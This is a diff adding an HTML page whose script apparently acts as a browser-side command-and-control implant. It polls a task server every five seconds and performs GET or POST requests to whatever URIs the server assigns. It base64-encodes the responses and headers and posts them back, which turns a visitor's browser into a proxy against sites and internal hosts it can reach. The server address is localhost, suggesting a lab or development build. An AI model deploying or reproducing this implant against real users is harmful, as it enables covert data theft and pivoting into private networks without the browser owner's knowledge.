@@ -1,0 +1,110 @@
+<html>
+<head>
+</head>
+<body>
+<div id="content" ></div>
+
+<script>
+var CLIENT_ID = 1;
+function makeRequest(id,destPath,postdata=null){
+  var headers = "TESTHEADERS";
+  var body = "TESTBODY";
+  if (postdata == null){
+    //do GET
+    //var xhttp = new XMLHttpRequest();
+    console.log('[*] performing GET against: '+destPath);
+    var targetxhttp = new XMLHttpRequest();
+  targetxhttp.onreadystatechange = function() {
+    if (targetxhttp.readyState == 4 && targetxhttp.status == 200) {
+      body = btoa(targetxhttp.responseText);
+      headers = btoa(targetxhttp.getAllResponseHeaders());
+      //recieved response from target, post to server
+      var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (xhttp.readyState == 4 && xhttp.status == 200) {
+      console.log(xhttp.responseText);
+    }
+  };
+  xhttp.open("POST", "http://127.0.0.1:5000/api/tasks/complete/"+id.toString(), true);
+  xhttp.setRequestHeader("Content-type","application/json");
+
+  xhttp.send('{"response":[{"headers":"'+headers+'","body":"'+body+'"}]}');
+  console.log("completed requests: ");
+    }
+  };
+targetxhttp.open("GET", destPath, true);
+targetxhttp.send();
+  }
+  else{
+    //do post
+    console.log('[*] performing POST against: '+destPath+' with data: '+postdata);
+    var targetxhttp = new XMLHttpRequest();
+  targetxhttp.onreadystatechange = function() {
+    if (targetxhttp.readyState == 4 && targetxhttp.status == 200) {
+      body = btoa(targetxhttp.responseText);
+      headers = btoa(targetxhttp.getAllResponseHeaders());
+      //recieved response from target, post to server
+      var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (xhttp.readyState == 4 && xhttp.status == 200) {
+      console.log(xhttp.responseText);
+    }
+  };
+  xhttp.open("POST", "http://127.0.0.1:5000/api/tasks/complete/"+id.toString(), true);
+  xhttp.setRequestHeader("Content-type","application/json");
+
+  xhttp.send('{"response":[{"headers":"'+headers+'","body":"'+body+'"}]}');
+  console.log("completed requests: ");
+    }
+  };
+targetxhttp.open("POST", destPath, true);
+targetxhttp.send(postdata);
+  }
+
+
+}
+function confirmRequests(requests){
+
+   var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (xhttp.readyState == 4 && xhttp.status == 200) {
+      console.log(xhttp.responseText);
+    }
+  };
+  xhttp.open("POST", "http://127.0.0.1:5000/api/tasks/confirm", true);
+  xhttp.setRequestHeader("Content-type","application/json");
+
+  xhttp.send(requests);
+  console.log("confirmed requests: ")
+}
+
+
+function poll() {
+    // make Ajax call here, inside the callback call:
+      var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (xhttp.readyState == 4 && xhttp.status == 200) {
+      var jsondata = JSON.parse(xhttp.responseText);
+      var tasks = jsondata.tasks;
+      confirmRequests(JSON.stringify(jsondata));
+    for(var i in tasks){
+      makeRequest(tasks[i].id,tasks[i].uri,tasks[i].postdata);
+    }
+    }
+  };
+  xhttp.open("GET", "http://127.0.0.1:5000/api/tasks/"+CLIENT_ID.toString(), true);
+  xhttp.send();
+    
+
+    setTimeout(poll, 5000);
+    // ...
+}
+poll();
+
+</script>
+</body>
+
+
+
+
+</html>
